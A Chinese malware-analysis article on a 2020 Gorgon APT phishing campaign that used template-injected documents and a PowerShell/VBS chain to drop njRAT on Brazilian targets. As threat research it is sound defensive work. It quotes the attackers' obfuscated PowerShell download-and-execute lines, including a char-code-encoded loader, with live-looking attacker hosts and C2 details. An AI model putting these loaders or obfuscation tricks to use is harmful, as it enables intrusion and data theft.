> 原文链接: https://www.anquanke.com//post/id/204023 


# 记一次GorgonAPT组织的完整攻击


                                阅读量   
                                **572554**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01fec4b7499b37f71f.jpg)](https://p2.ssl.qhimg.com/t01fec4b7499b37f71f.jpg)



## 前言

之前在日常样本运营中，发现了一个以巴西乐队命名的攻击文档和钓鱼邮件，并在随后的关联分析中发现，此次攻击活动疑似来自一个名为Gorgon的攻击组织，而Gorgon是一个被认为来自南亚某国家的攻击组织，PAN公司的Unit42团队将该攻击活动命名为Aggah。

捕获的初始样本名为DADOS BANDA BELEZAPURA.doc，DADOS BANDA BELEZAPURA是巴西当地的一个知名乐队。

通过关联分析，捕获到一例名为CNPJ E DADOS DO CARTÃO PARA CONFIRMAÇÃO DE RESERVA.docx的相关文档，中文翻译为：CNPJ预订确认卡数据.docx，而CNPJ是巴西公司在巴西法定的唯一身份识别，CNPJ对于巴西商铺的意义类似于身份证对于我国公民的意义，CNPJ是确认巴西商铺的唯一标识。

结合钓鱼邮件内容，样本命名以等关联信息，基本可以断定本次攻击是一起Gorgon针对巴西公寓、商户的攻击事件。



## 针对巴西公寓的攻击分析

### <a class="reference-link" name="%E6%A6%82%E8%BF%B0"></a>概述

本次投递的Downloader是一个doc文档，样本打包时间为2020年1月3日，上传vt的时间为2020年1月7日。样本作者信息为：mateus eaea

[![](https://p3.ssl.qhimg.com/t0146d9bbd6cc1482fa.png)](https://p3.ssl.qhimg.com/t0146d9bbd6cc1482fa.png)

钓鱼邮件如下：

[![](https://p3.ssl.qhimg.com/t0141cddc3bd12e2a1a.png)](https://p3.ssl.qhimg.com/t0141cddc3bd12e2a1a.png)

本次攻击主要是利用原始的docx文档模板注入rtf文件，注入的rtf会通过宏代码解密执行powershell，powershell下载执行vbs脚本，最后通过vbs脚本解密执行powershell释放njrat远控木马。具体流程如下：

[![](https://p1.ssl.qhimg.com/t010b3dd3eb314efe8c.png)](https://p1.ssl.qhimg.com/t010b3dd3eb314efe8c.png)

### <a class="reference-link" name="%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"></a>基本信息

原始样本为模板注入的doc文档，注入地址为：http[:]//bit[.]ly/2Fivk8q

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c186e6d04a7e7124.png)

文档内容如下：

[![](https://p3.ssl.qhimg.com/t0152e9b8e8db1cdd58.png)](https://p3.ssl.qhimg.com/t0152e9b8e8db1cdd58.png)

注入的文档md5为：7fe85327f57691535762dae17c50457e

[![](https://p5.ssl.qhimg.com/t013d76d5f06338effd.png)](https://p5.ssl.qhimg.com/t013d76d5f06338effd.png)

### <a class="reference-link" name="%E6%B3%A8%E5%85%A5%E6%96%87%E6%A1%A3%E5%88%86%E6%9E%90"></a>注入文档分析

注入的文档为宏代码攻击的rtf文件，文件打开会启用excel并不断弹框提示用于启用宏，如果用户点击禁用，则会弹出下一个excel宏提示，一共八次，该技术和之前Gorgon使用的注入技术保持一致。

[![](https://p3.ssl.qhimg.com/t014ee77066ecb1a6d8.png)](https://p3.ssl.qhimg.com/t014ee77066ecb1a6d8.png)

恶意宏代码执行后，会解密执行如下的powershell代码：

`"C:WindowsSystem32WindowsPowerShellv1.0powershell.exe" $T='*EX'.replace('*','I');sal M $T;'(&amp;(GCM'+' *W-O*)'+'Net.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Stri'+'ng(''http://empresariadohoteleiro.com/janeiro2020/Attack.jpg'')'|M|M`

该powershell代码用于从hxxp[:]//empresariadohoteleiro[.]com/janeiro2020/Attack[.]jpg<br>
下载后续payload到本地执行

### <a class="reference-link" name="Attack.jpg"></a>Attack.jpg

下载回来样本后缀为jpg，但实际上是一个powershell脚本，由于上面的powershell代码最后执行了IEX，所以这里后缀不会影响脚本的执行。

[![](https://p5.ssl.qhimg.com/t017c95dfb64dda3865.png)](https://p5.ssl.qhimg.com/t017c95dfb64dda3865.png)

通过代码可以得知，该段powershell代码通过IEX执行之后

会尝试下载http[:]//empresariadohoteleiro[.]com/janeiro2020/srvjaneiro03[.]jpg到本地保为%APPDATA%dimasjaneiro.vbs

下载成功则会通过start-process执行下载的vbs

下载的vbs样本MD5为：2c610594e3230b15af32874b1676861a

[![](https://p5.ssl.qhimg.com/t01c3a14f55c2f7d6da.png)](https://p5.ssl.qhimg.com/t01c3a14f55c2f7d6da.png)

### <a class="reference-link" name="srvjaneiro03.jpg"></a>srvjaneiro03.jpg

下载到本地的srvjaneiro03.jpg实际上为一个vbs脚本，脚本最开始会给&lt;f&gt;变量赋值，然后通过替换去除混淆内容，再通过Fly函数调用powershell执行

[![](https://p5.ssl.qhimg.com/t011c06eee1bc0ebfea.png)](https://p5.ssl.qhimg.com/t011c06eee1bc0ebfea.png)

最终会解密执行如下的powershell代码：

`Powershell $OSAFIUASOFIHKLJHFSGPSATYPEWFASHGLSDJFG=@(100,111,32,123,36,112,105,110,103,32,61,32,116,101,115,116,45,99,111,110,110,101,99,116,105,111,110,32,45,99,111,109,112,32,103,111,111,103,108,101,46,99,111,109,32,45,99,111,117,110,116,32,49,32,45,81,117,105,101,116,125,32,117,110,116,105,108,32,40,36,112,105,110,103,41,59,36,112,50,50,32,61,32,91,69,110,117,109,93,58,58,84,111,79,98,106,101,99,116,40,91,83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,121,80,114,111,116,111,99,111,108,84,121,112,101,93,44,32,51,48,55,50,41,59,91,83,121,115,116,101,109,46,78,101,116,46,83,101,114,118,105,99,101,80,111,105,110,116,77,97,110,97,103,101,114,93,58,58,83,101,99,117,114,105,116,121,80,114,111,116,111,99,111,108,32,61,32,36,112,50,50,59,91,118,111,105,100,93,32,91,83,121,115,116,101,109,46,82,101,102,108,101,99,116,105,111,110,46,65,115,115,101,109,98,108,121,93,58,58,76,111,97,100,87,105,116,104,80,97,114,116,105,97,108,78,97,109,101,40,39,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,39,41,59,36,102,106,61,91,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,46,73,110,116,101,114,97,99,116,105,111,110,93,58,58,67,97,108,108,66,121,110,97,109,101,40,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,44,39,68,111,119,36,95,36,108,111,97,100,83,116,114,105,36,95,36,103,39,46,114,101,112,108,97,99,101,40,39,36,95,36,39,44,39,110,39,41,44,91,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,46,67,97,108,108,84,121,112,101,93,58,58,77,101,116,104,111,100,44,39,104,116,116,112,58,47,47,101,109,112,114,101,115,97,114,105,97,100,111,104,111,116,101,108,101,105,114,111,46,99,111,109,47,106,97,110,101,105,114,111,50,48,50,48,47,114,110,112,106,97,110,101,105,114,111,48,51,46,106,112,103,39,41,124,73,69,88,59,91,66,121,116,101,91,93,93,36,116,111,116,111,61,91,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,46,73,110,116,101,114,97,99,116,105,111,110,93,58,58,67,97,108,108,66,121,110,97,109,101,40,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,44,39,68,111,119,36,95,36,108,111,97,100,83,116,114,105,36,95,36,103,39,46,114,101,112,108,97,99,101,40,39,36,95,36,39,44,39,110,39,41,44,91,77,105,99,114,111,115,111,102,116,46,86,105,115,117,97,108,66,97,115,105,99,46,67,97,108,108,84,121,112,101,93,58,58,77,101,116,104,111,100,44,39,104,116,116,112,58,47,47,101,109,112,114,101,115,97,114,105,97,100,111,104,111,116,101,108,101,105,114,111,46,99,111,109,47,106,97,110,101,105,114,111,50,48,50,48,47,110,106,97,114,114,111,98,97,106,110,114,48,51,46,106,112,103,39,41,46,114,101,112,108,97,99,101,40,39,64,95,48,39,44,39,48,120,39,41,124,73,69,88,59,36,111,98,106,32,61,64,40,39,82,101,103,83,118,99,115,46,101,120,101,39,44,36,116,111,116,111,41,59,36,103,50,50,61,36,97,46,71,101,116,84,121,112,101,40,39,71,105,118,97,114,97,39,41,59,36,121,61,36,103,50,50,46,71,101,116,77,101,116,104,111,100,40,39,70,114,101,101,68,111,109,39,41,59,36,106,61,91,65,99,116,105,118,97,116,111,114,93,58,58,67,114,101,97,116,101,73,110,115,116,97,110,99,101,40,36,103,50,50,44,36,110,117,108,108,41,59,36,121,46,73,110,118,111,107,101,40,36,106,44,36,111,98,106,41);[char[]]$OSAFIUASOFIHKLJHFSGPSATYPEWFASHGLSDJFG -join ''|I`E`X`

格式化该代码得到：

<code>do `{`$ping = test-connection -comp google.com -count 1 -Quiet`}`<br>
until ($ping);<br>
$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);<br>
[System.Net.ServicePointManager]::SecurityProtocol = $p22;<br>
[void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');<br>
$fj=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'Dow$_$loadStri$_$g'.replace('$_$','n'),[Microsoft.VisualBasic.CallType]::Method,'http://empresariadohoteleiro.com/janeiro2020/rnpjaneiro03.jpg')|IEX;<br>
[Byte[]]$toto=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'Dow$_$loadStri$_$g'.replace('$_$','n'),[Microsoft.VisualBasic.CallType]::Method,'http://empresariadohoteleiro.com/janeiro2020/njarrobajnr03.jpg').replace('[@_0](https://github.com/_0)','0x')|IEX;<br>
$obj =@('RegSvcs.exe',$toto);<br>
$g22=$a.GetType('Givara');$y=$g22.GetMethod('FreeDom');<br>
$j=[Activator]::CreateInstance($g22,$null);$y.Invoke($j,$obj)</code>

由代码可以得知，此段代码执行之后将会：

下载http[:]//empresariadohoteleiro[.]com/janeiro2020/rnpjaneiro03[.]jpg到本地执行

下载http[:]//empresariadohoteleiro[.]com/janeiro2020/njarrobajnr03[.]jpg到本地替换数据后执行。

此外，该vbs脚本还会将自己移动到%APPDATA%目录下并设置一个任务计划，任务计划用于每分钟执行一次该vbs脚本：

[![](https://p3.ssl.qhimg.com/t01ac2a8cd8d837597b.png)](https://p3.ssl.qhimg.com/t01ac2a8cd8d837597b.png)

### <a class="reference-link" name="rnpjaneiro03.jpg"></a>rnpjaneiro03.jpg

下载回来的rnpjaneiro03为一个powershell脚本，MD5为：eba6b7e9bab2b63b63cb6080ee83236f

脚本通过sal将IEX重命名为g，将$Cli作为参数传递到解密函数中解密获取数据流并通过g(IEX)调用执行

[![](https://p5.ssl.qhimg.com/t01f1ed382e0e59e0fe.png)](https://p5.ssl.qhimg.com/t01f1ed382e0e59e0fe.png)

将解密得到的数据流写入到3.txt

[![](https://p4.ssl.qhimg.com/t01f3a3674ea72615cb.png)](https://p4.ssl.qhimg.com/t01f3a3674ea72615cb.png)

这里的字节流以十进制显示，文件头内容为77 90 144 ，转换为16进制刚好是4D 5A 90 所以这里应该也是一个PE文件。

将数据转换为十六进制并转存到winhex中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ccc606bf3cdb7c9d.png)

### <a class="reference-link" name="njarrobajnr03"></a>njarrobajnr03

njarrobajnr03是一个纯数据文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010c1ef8573d1b5929.png)

由于powershell下载该payload的时候有如下语句：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0173bbf489104c8104.png)

所以powershell下载该样本之后，会将这里的[@_0](https://github.com/_0)替换为0x再执行IEX

[![](https://p1.ssl.qhimg.com/t01bf9de3f704cc46b8.png)](https://p1.ssl.qhimg.com/t01bf9de3f704cc46b8.png)

格式化写入到winhex中会得到一个PE文件：

[![](https://p4.ssl.qhimg.com/t011e47577bba4362f5.png)](https://p4.ssl.qhimg.com/t011e47577bba4362f5.png)

得到的PE为C#编写的样本，MD5为：87dc93b61a224d1ec45be29998013ae9

[![](https://p2.ssl.qhimg.com/t014dd72f63cd61c251.png)](https://p2.ssl.qhimg.com/t014dd72f63cd61c251.png)

### <a class="reference-link" name="%E5%90%8E%E7%BB%ADPE%E5%88%86%E6%9E%90"></a>后续PE分析

原始的C#样本编译名称为stub.exe,带有一定混淆

[![](https://p3.ssl.qhimg.com/t01e0058ce0fc3ec040.png)](https://p3.ssl.qhimg.com/t01e0058ce0fc3ec040.png)

样本去混淆后，经过分析可以得知，该PE文件是njrat家族的远控马

[![](https://p1.ssl.qhimg.com/t0149c7732c5bc759c5.png)](https://p1.ssl.qhimg.com/t0149c7732c5bc759c5.png)

木马的互斥体名称为：&lt;Edo_Tensei-eS6ZxVfJXBgJ&gt;



## 针对巴西商户的攻击分析

### <a class="reference-link" name="%E6%A6%82%E8%BF%B0"></a>概述

本次投递的Downloader是一个docx文档，样本打包时间为2020年1月6日，上传vt的时间为2020年月7日。

样本作者信息和上面样本作者信息保持一致，均为mateus eaea

[![](https://p2.ssl.qhimg.com/t011115afbd699ff432.png)](https://p2.ssl.qhimg.com/t011115afbd699ff432.png)

本次攻击主要是利用原始的docx文档模板注入rtf文件，注入的rtf会通过宏代码解密执行powershell，powershell下载执行vbs脚本，最后通过vbs脚本解密执行powershell释放njrat远控木马。具体流程如下：

[![](https://p2.ssl.qhimg.com/t01e254fa973d59ef09.png)](https://p2.ssl.qhimg.com/t01e254fa973d59ef09.png)

### <a class="reference-link" name="%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"></a>基本信息

原始样本为模板注入的docx文档，注入地址为：http[:]//bit[.]ly/2T2ofAC

[![](https://p5.ssl.qhimg.com/t0137ecc61bbef89190.png)](https://p5.ssl.qhimg.com/t0137ecc61bbef89190.png)

注入的文档md5为：6eac6bd76c4ce578acc6ed418af54b8b

[![](https://p0.ssl.qhimg.com/t0170beca34b02a1b48.png)](https://p0.ssl.qhimg.com/t0170beca34b02a1b48.png)

### <a class="reference-link" name="%E6%B3%A8%E5%85%A5%E6%96%87%E6%A1%A3%E5%88%86%E6%9E%90"></a>注入文档分析

注入的文档为宏代码攻击的rtf文件，文件打开会启用excel并不断弹框提示用于启用宏，如果用户点击禁用，则会弹出下一个excel宏提示，一共九次，该技术和之前Gorgon使用的注入技术保持一致。

[![](https://p5.ssl.qhimg.com/t01b8ecf8dbee153d6f.png)](https://p5.ssl.qhimg.com/t01b8ecf8dbee153d6f.png)

恶意宏代码执行后会解密出如下命令：<br>`"$T='*EX'.replace('*','I');sal M $T;'(&amp;(GCM'+' *W-O*)'+'Net.'+'Web'+'Cli'+'ent)'+'.Dow'+'nl'+'oad'+'Stri'+'ng(''http://191.239.243.112/documento/cdt.jpg'')'|M|M"`

代码会从http[:]//191.239.243.112/documento/cdt[.]jpg下载文件到本地执行

### <a class="reference-link" name="cdt.jpg"></a>cdt.jpg

下载回来样本后缀为jpg，但实际上是一个powershell脚本，由于上面的powershell代码最后执行了IEX，所以这里后缀不会影响脚本的执行,和第一个样本不同的是，这里会尝试从两个地址下载不同的payload到本地执行

[![](https://p2.ssl.qhimg.com/t018927b66398eaba6c.png)](https://p2.ssl.qhimg.com/t018927b66398eaba6c.png)

通过代码可以得知，该段powershell代码通过IEX执行之后

会尝试下载http[:]//191.239.243.112/documento/njexp05jan[.]jpg到本地保为%APPDATA%cdtdaobumbum.vbs

会尝试下载http[:]//191.239.243.112/documento/njnyan05jan[.]jpg到本地保存为%APPDATA%cdtdaabuuda.vbs

下载成功则会通过start-process执行下载的vbs

### <a class="reference-link" name="njexp05jan.jpg"></a>njexp05jan.jpg

这里的njexp05jan.jpg实际上是一个vbs脚本。

njexp05jan.vbs格式和上一个样本所下载的vbs格式几乎一致，只有解密的powershell不同，本次样本执行的powershell代码如下：

[![](https://p2.ssl.qhimg.com/t01fe6112eb2f5c05a6.png)](https://p2.ssl.qhimg.com/t01fe6112eb2f5c05a6.png)

经过转换，执行的powershell代码如下：

<code>do<br>
`{`<br>
$ping = test-connection -comp google.com -count 1 -Quiet<br>
`}`<br>
until ($ping);<br>
$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);<br>
[System.Net.ServicePointManager]::SecurityProtocol = $p22;<br>
[void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');<br>
$fj=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'Dow$_$loadStri$_$g'.replace('$_$','n'),[Microsoft.VisualBasic.CallType]::Method,'http://empresariadohoteleiro.com/janeiro2020/rnpjaneiro03.jpg')|IEX;[Byte[]]$toto=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'Dow$_$loadStri$_$g'.replace('$_$','n'),[Microsoft.VisualBasic.CallType]::Method,'http://empresariadohoteleiro.com/janeiro2020/05janeironjexp.jpg').replace('[@_0](https://github.com/_0)','0x')|IEX;<br>
$obj =@('RegSvcs.exe',$toto);<br>
$g22=$a.GetType('Givara');<br>
$y=$g22.GetMethod('FreeDom');<br>
$j=[Activator]::CreateInstance($g22,$null);<br>
$y.Invoke($j,$obj)</code>

从代码可以得知，该powershell脚本还会尝试下载两个后续payload到本地并通过IEX执行。

下载链接分别为：

http[:]//empresariadohoteleiro[.]com/janeiro2020/rnpjaneiro03[.]jpg

http[:]//empresariadohoteleiro[.]com/janeiro2020/05janeironjexp[.]jpg

同样的，该vbs也会设置任务计划，任务计划的名称为&lt;mailing&gt;

设置好的任务计划如下：

[![](https://p2.ssl.qhimg.com/t015642a14ef35978de.png)](https://p2.ssl.qhimg.com/t015642a14ef35978de.png)

### <a class="reference-link" name="njnyan05jan.jpg"></a>njnyan05jan.jpg

同样的，这里的njnyan05jan.jpg也是一个vbs脚本。

njnyan05jan.vbs和njexp05jan.vbs结构完全相同，也是只更改了powershell部分的数据代码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01322d7e3804cc98e6.png)

同样的方法，拿到一段powershell代码：

[![](https://p0.ssl.qhimg.com/t01a47cbc9128fe1d96.png)](https://p0.ssl.qhimg.com/t01a47cbc9128fe1d96.png)

同payload1，这里依旧是给了两个地址用于下载执行：http[:]//empresariadohoteleiro[.]com/janeiro2020/rnpjaneiro03[.]jpg

http[:]//empresariadohoteleiro[.]com/janeiro2020/05janeironjnyan[.]jpg

该vbs设置的任务计划名为&lt;store&gt;

比较奇怪的是，代码里面有这样一句注释语句：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011886e1b7904dc4a2.png)

结合样本名称中不断出现的exp字样，以及与上一个样本的对比，攻击者目前很有可能正在测试更新代码。

### <a class="reference-link" name="%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5payload"></a>第三阶段payload

将后续部分的payload下载到本地，红色部分是njnyan05jan.vbs所下载的样本

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01120d34a864c65da5.png)

<a class="reference-link" name="05janeironjexp"></a>**05janeironjexp**

同样的，脚本运行后会解密释放一个PE文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01dee8c1f0f8e90c79.png)

该PE是一个C#编写的攻击样本：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a60bf74c9d6873c6.png)

<a class="reference-link" name="05janeironjnyan"></a>**05janeironjnyan**

该脚本运行后释放的PE文件如下

[![](https://p0.ssl.qhimg.com/t014011ff1011b37c19.png)](https://p0.ssl.qhimg.com/t014011ff1011b37c19.png)

通过hash计算可以得到两个文件的hash，同时确定文件不相同

[![](https://p1.ssl.qhimg.com/t01cdf233c65de2079d.png)](https://p1.ssl.qhimg.com/t01cdf233c65de2079d.png)

<a class="reference-link" name="rnpjaneiro03"></a>**rnpjaneiro03**

第二阶段两个payload下载回来的rnpjaneiro03.jpg是同一个文件和第一部分样本中下载的rnpjaneiro03.jpg是同一个文件，这里不再次分析。

### <a class="reference-link" name="%E5%90%8E%E7%BB%ADPE%E5%88%86%E6%9E%90"></a>后续PE分析

分析样本最后解密的PE文件

经过分析，两个样本均为njrat远控木马，对njrat远控的概要分析如下

<a class="reference-link" name="payload1"></a>**payload1**

main函数中调用perfect

[![](https://p3.ssl.qhimg.com/t018e7384fb46c4647b.png)](https://p3.ssl.qhimg.com/t018e7384fb46c4647b.png)

程序最开始会解密三个字符串，分别是分隔拼接字符串、C2地址、C2端口

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01726a23d0567b920e.png)

解密出请求的域名：

ducksys.dyckdns.org

[![](https://p2.ssl.qhimg.com/t0167230c2f5c1b4fbe.png)](https://p2.ssl.qhimg.com/t0167230c2f5c1b4fbe.png)

C2端口：5550

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017681e16ccd565473.png)

创建互斥体：&lt;Edo_Tensei-3mcvLOcL3WPU&gt;

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c050422a5753aed5.png)

接着程序会启动两个线程，分别是RC和SAW，其中RC线程用于信息窃取和上传，SAW线程用于检索当前的窗口信息等。具体实现如下：

<a class="reference-link" name="RC%E7%BA%BF%E7%A8%8B"></a>**RC线程**

通过ACM解密出在线剪贴板，用于获取攻击者预先准备好的内容

hxxps[:]//pastebin[.]com/raw/FeCfa8vf

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0135ce6448a0d05a9d.png)

这里的hxxps[:]//pastebin[.]com/raw/FeCfa8vf是一个在线剪贴板，内容就是之前调试得到的C2：

ducksys.ddns.net[:]5550

接着尝试TCP连接C2并且通过inf函数发送计算机基本信息到服务器

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013874f6eb36fe3a59.png)

inf函数会收集并拼接计算机的一些基本信息，然后通过tensei.sk作为分隔符号

[![](https://p0.ssl.qhimg.com/t01332539348f9ec524.png)](https://p0.ssl.qhimg.com/t01332539348f9ec524.png)

收集的基本信息有：

• MachineName<br>
• Username<br>
• LastWriteTime.Data<br>
• OSFullName<br>
• SP版本号<br>
• 操作系统位数(x86/x64)

所有收集到的信息存入array2[0]

此外，程序还会收集如下信息：

• 在array2[1]存入磁盘信息<br>
• 在array2[3]存入RAM信息<br>
• 在array2[5]标识是否是管理员用户<br>
• 在array2[7]存入操作系统的Product

[![](https://p0.ssl.qhimg.com/t0191940014e04fc62a.png)](https://p0.ssl.qhimg.com/t0191940014e04fc62a.png)

将所有的数据经过base64编码方便后续的传输

[![](https://p5.ssl.qhimg.com/t0154aaf718ffe9e488.png)](https://p5.ssl.qhimg.com/t0154aaf718ffe9e488.png)

<a class="reference-link" name="SAW%E7%BA%BF%E7%A8%8B"></a>**SAW线程**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01101cf699388a7c5c.png)

通过对该样本的分析，可以确定该样本主要功能是窃密。

此外，通过对样本的调试可以得知，样本中很多功能是根据flag的值来决定的，而flag的值跟样本的运行状态相关，这里贴一些关键的函数：

沙箱检测：

这里第一个字符串base64解码得到一个注册表键值用于协助进行环境判断

SystemCurrentControlSetServicesDiskEnum

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018f88c1878c2cd22d.png)

如果检测到在沙箱环境，则会通过第二个base64编码的字符串删除自身：

cmd.exe /c ping 0 -n 2 &amp; del

设置开机自启动：

[![](https://p4.ssl.qhimg.com/t01fe48abd491d1251f.png)](https://p4.ssl.qhimg.com/t01fe48abd491d1251f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015add2e796b847ab1.png)

### <a class="reference-link" name="payload2"></a>payload2

同payload1，payload2也是一个njart远控，payload2的互斥体名称为&lt;a6837ac27e&gt;,出了payload1中的基本art功能，payload2似乎还有着键盘监听的功能。

payload2的C2地址为：ducksys.duckdns.org:5552

程序首先还是创建一个互斥体,互斥体名为&lt;a6837ac27e&gt;,然后启动一个名为Receive的线程

[![](https://p5.ssl.qhimg.com/t01629a01d8f615ecd8.png)](https://p5.ssl.qhimg.com/t01629a01d8f615ecd8.png)

第二个线程WRK用于键盘监听

[![](https://p4.ssl.qhimg.com/t01eb66df163a1421d9.png)](https://p4.ssl.qhimg.com/t01eb66df163a1421d9.png)



## 总结

Gorgon，一个被认为来自南亚某国家的黑客组织，其目标涉及全球政府，外贸等行业，且目的不纯粹为了金钱，还可能与政治相关。<br>
